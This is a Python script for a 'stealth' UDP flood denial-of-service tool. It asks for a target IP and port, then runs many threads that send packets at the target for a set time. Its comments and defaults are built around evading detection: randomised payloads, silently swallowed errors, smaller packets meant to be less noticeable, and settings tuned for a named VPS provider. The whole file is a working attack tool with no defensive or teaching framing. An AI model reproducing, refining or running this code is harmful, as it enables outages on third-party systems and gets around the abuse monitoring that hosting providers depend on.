import socket
import random
import time
import sys
from threading import Thread, Lock
from math import ceil
from time import sleep

class StealthUDPFlood:
    def __init__(self, target_ip, target_port=None, packet_size=650, threads=50, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port or random.randint(1024, 65535)
        self.packet_size = min(packet_size, 650)  # Keep packets small
        self.threads = min(threads, 50)  # Limit threads
        self.duration = duration
        self.sent_packets = 0
        self.running = False
        self.lock = Lock()
        
        # Randomize the payload pattern
        self.payload = self._generate_payload()
        
        # VPS evasion parameters
        self.packet_jitter = 0.01  # Random delay between packets
        self.rate_limit = 1000     # Max packets per second per thread
        self.last_sent = 0
        
    def _generate_payload(self):
        """Generate random but consistent payload to avoid pattern detection"""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choices(chars, k=self.packet_size)).encode()
    
    def _get_socket(self):
        """Create a new socket with randomized settings"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Randomize source port (when possible)
        try:
            sock.bind(('0.0.0.0', random.randint(1024, 65535)))
        except:
            pass
            
        return sock
    
    def _send_packets(self):
        """Thread worker for sending packets with randomized patterns"""
        sock = self._get_socket()
        packets_sent = 0
        
        while self.running and time.time() < self.end_time:
            try:
                # Randomize target port if not specified
                port = self.target_port if self.target_port else random.randint(1, 65535)
                
                # Randomize packet size slightly
                size = max(10, min(1024, self.packet_size + random.randint(-50, 50)))
                payload = self.payload[:size]
                
                sock.sendto(payload, (self.target_ip, port))
                
                with self.lock:
                    self.sent_packets += 1
                    packets_sent += 1
                
                # Rate limiting and jitter
                if packets_sent % self.rate_limit == 0:
                    sleep(self.packet_jitter * random.random())
                    
            except Exception as e:
                # Silently handle errors to avoid detection
                sock.close()
                sock = self._get_socket()
                sleep(0.1)
        
        sock.close()
    
    def run(self):
        """Start the flood attack with evasion techniques"""
        self.running = True
        self.end_time = time.time() + self.duration
        self.start_time = time.time()
        
        # Create and start threads
        threads = []
        for _ in range(self.threads):
            t = Thread(target=self._send_packets)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Display progress
        self._display_progress()
        
        # Wait for threads to complete
        for t in threads:
            t.join()
            
        self.running = False
    
    def _display_progress(self):
        """Show progress with the custom hood style"""
        hood = """
                  .88888888:.
                88888888.88888.
              .8888888888888888.
              888888888888888888
              88' _`88'_  `88888
              88 88 88 88  88888
              88_88_::_88_:88888
              88:::,::,:::::8888
              88`:::::::::'`8888
             .88  `::::'    8:88.
            8888            `8:888.
          .8888'             `888888.
         .8888:..  .::.  ...:'8888888:.
        .8888.'     :'     `'::`88:88888
       .8888        '         `.888:8888.
      888:8         .           888:88888
    .888:88        .:           888:88888:
    8888888.       ::           88:888888
    `.::.888.      ::          .88888888
   .::::::.888.    ::         :::`8888'.:.
  ::::::::::.888   '         .::::::::::::
  ::::::::::::.8    '      .:8::::::::::::.
 .::::::::::::::.        .:888:::::::::::::
 :::::::::::::::88:.__..:88888:::::::::::'
  `'.:::::::::::88888888888.88:::::::::'
        `':::_:' -- '' -'-' `':_::::'`
        """
        
        print(hood)
        print("\n=== Stealth UDP Flood ===")
        print(f"Target: {self.target_ip}:{self.target_port or 'random'}")
        print(f"Threads: {self.threads}")
        print(f"Duration: {self.duration}s")
        print("\n[Press Ctrl+C to stop]\n")
        
        start = time.time()
        try:
            while self.running and time.time() < self.end_time:
                elapsed = time.time() - start
                with self.lock:
                    rate = self.sent_packets / elapsed if elapsed > 0 else 0
                
                sys.stdout.write(f"\rPackets Sent: {self.sent_packets} | Rate: {rate:.1f} pkt/s")
                sys.stdout.flush()
                sleep(0.5)
                
        except KeyboardInterrupt:
            self.running = False
            print("\n\nStopping attack...")
        
        print(f"\nTotal packets sent: {self.sent_packets}")

if __name__ == "__main__":
    # Example usage with safe defaults for Kamatera VPS
    target = input("Enter target IP: ").strip()
    port = input("Enter target port (leave blank for random): ").strip()
    port = int(port) if port.isdigit() else None
    
    # Safe parameters for avoiding detection
    flood = StealthUDPFlood(
        target_ip=target,
        target_port=port,
        packet_size=600,    # Smaller packets are less noticeable
        threads=30,         # Moderate thread count
        duration=30         # Shorter duration
    )
    
    flood.run()